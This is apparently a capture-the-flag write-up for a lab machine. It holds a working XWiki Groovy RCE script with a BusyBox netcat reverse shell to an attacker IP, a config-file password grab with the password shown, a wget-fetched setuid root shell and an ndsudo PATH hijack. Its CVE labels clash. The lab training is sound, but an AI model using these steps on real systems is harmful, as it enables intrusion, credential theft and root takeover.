Hosts/Domain : editor.htb , wiki.editor.htb
XWiki RCE (CVE-2024-31982)

### BusyBox reverse shell

### **What is BusyBox?**

**BusyBox** is a single binary that provides many Unix tools in one. It’s often used in embedded systems like routers, IoT, or lightweight Linux installs.

In this context:

- It includes a **lightweight version of `nc` (netcat)**.
    
- It allows you to do:

```
busybox nc <LHOST> <LPORT> -e /bin/sh
```



### 🆚 **What’s the actual difference between both scripts?**

|Feature|Original PoC|BusyBox Reverse Shell|
|---|---|---|
|**Command Execution**|Accepts custom command|Hardcoded reverse shell|
|**Input**|Interactive (you pass command)|No input; direct payload|
|**Output**|Fetches and prints result|No result shown (shell only)|
|**Use Case**|Test RCE, explore further|Get shell access immediately|
|**Payload Endpoint**|`/DatabaseSearch?...`|`/SolrSearch?...`|
|**Dependency**|Requires command in script|Requires netcat on target (via BusyBox)|

### Why BusyBox Version?

Because XWiki might not support full `/bin/bash`, or `nc` is only available via BusyBox, this is the safer minimal reverse shell method for systems with limited tools.
### RCE : 
```
import requests
from html import unescape

def detect_protocol(domain):
    """Try to connect via HTTPS first, fallback to HTTP if unavailable."""
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"
    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] HTTPS available: {https_url}")
            return https_url
    except:
        print("[!] HTTPS not available. Falling back to HTTP.")
    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] HTTP available: {http_url}")
            return http_url
    except:
        print("[✖] Unable to reach target.")
        exit(1)

def send_direct_revshell(target_url, lhost, lport):
    """Send reverse shell payload using Groovy RCE with BusyBox."""
    print(f"[+] Sending direct reverse shell via BusyBox to {lhost}:{lport} ...")
    cmd = f"busybox nc {lhost} {lport} -e /bin/sh"
    encoded_cmd = cmd.replace('"', '\\"')
    payload_url = (
        f"{target_url}/bin/get/Main/SolrSearch?media=rss&text="
        f"%7D%7D%7D%7B%7Basync%20async=false%7D%7D"
        f"%7B%7Bgroovy%7D%7D\"{encoded_cmd}\".execute()%7B%7B/groovy%7D%7D"
        f"%7B%7B/async%7D%7D"
    )
    try:
        requests.get(payload_url, timeout=5)
    except requests.exceptions.RequestException:
        pass  # Ignore errors; reverse shell may be triggered

if __name__ == "__main__":
    print("=" * 80)
    print("XWiki CVE-2025-24893 - Direct Reverse Shell via BusyBox")
    print("=" * 80)
    target = "editor.htb:8080/xwiki"
    lhost = "10.10.14.81"  # <-- Change this to your listener IP
    lport = "4444"
    target_url = detect_protocol(target)
    send_direct_revshell(target_url, lhost, lport)
    print("[✔] Payload sent. Check your listener (nc -lvnp 4444).")
```

- nc -nvlp 4444
- python3 exploit.py



#### User flag
🧾 What is hibernate.cfg.xml in XWiki? 🔧 Hibernate Configuration File This file belongs to Hibernate, a Java framework used for ORM (Object-Relational Mapping). In the context of XWiki, it is a core configuration file that defines how XWiki connects to its backend database. It typically includes settings such as: 
Database type and connection URL
Database username and password
Driver class
SQL dialect 
Connection pool settings ,


- Extract username by ls /home : oliver
- extraxt passworf by `cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password`
- Password : theEd1t0rTeam99
- SSSH into oliver

`ssh oliver@editor.htb`
- got user flag.

### privsec
- find / -perm -4000 -type f 2>/dev/null : check for suid
- we checl `nsudo` binary permissions
- Executable by netdata group.


### POC 
As a user that has permission to run `ndsudo`:

1. Place an executable with a name that is on `ndsudo`’s list of commands (e.g. `nvme`) in a writable path
2. Set the `PATH` environment variable so that it contains this path
3. Run `ndsudo` with a command that will run the aforementioned executable.

### Steps:
1. Create payload c
```c
//megacli.c
#include <unistd.h>
#include <stdlib.h>
int main() {
setuid(0);
setgid(0);
execl("/bin/bash", "bash", "-i", NULL);
return 0;
}
```

2. Compile
```
gcc megacli.c -o megacli
```

3. On target

```
mkdir -p ~/fakebin && wget -q http://10.10.xx.xx/megacli -O ~/fakebin/megacli &&
chmod +x ~/fakebin/megacli && export PATH=~/fakebin:$PATH
```

4. exploit using : 
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
```
5. cat /root/root.txt
